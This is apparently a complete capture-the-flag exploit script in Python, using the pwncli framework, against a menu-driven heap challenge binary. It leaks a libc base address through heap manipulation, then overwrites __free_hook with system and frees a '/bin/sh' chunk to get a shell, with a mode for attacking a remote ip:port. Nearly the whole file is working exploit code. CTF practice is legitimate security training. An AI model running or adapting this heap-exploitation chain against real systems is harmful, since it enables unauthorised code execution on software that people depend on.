#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'Your choice: \n')
    sl(i2b(choice))
def add(data):
    cmd(1)
    ru(b'content of the new item: \n')
    sl(data)
def edit(idx, newdata):
    cmd(3)
    ru(b'Index: \n')
    sl(i2b(idx))
    ru(b'new content: \n')
    sl(newdata)
def show(idx):
    cmd(2)
    ru(b'Index: \n')
    sl(i2b(idx))
def vuln(idx, choice):
    cmd(4)
    ru(b'West/East? (0 is West and 1 is East)\n')
    sl(i2b(choice))
    ru(b'Launching index: \n')
    sl(i2b(idx))

def fuzz_bubble():
    add(b"a"*0x100)
    add(b"b"*0x100)
    add(b"c"*0x100)
    vuln(0, 1)
    edit(1, p64(0xdeadbeef)+p64(0xcafecafe))
    ia()

# fuzz_bubble()
add(b"a"*0x200)
add(b"a"*0x520)
add(b"a"*0x100)
vuln(1, 1)

show(2)
ru(b"The 2th item: \n")
libc_base = u64_ex(r(6)) - 0x1ecbe0
lg("libc_base")

add(b"b"*0x100)
add(b"b"*0x100)
add(b"b"*0x100)
vuln(3, 1)
edit(4, p64(libc_base + libc.sym.__free_hook - 0x10))

add(b"sh\x00".ljust(0x100, b"\x00"))
payload = b"/bin/sh\x00".ljust(0X10, b"\x00") + p64(libc_base + libc.sym.system)
payload = payload.ljust(0x100, b"a")
add(payload)

ia()
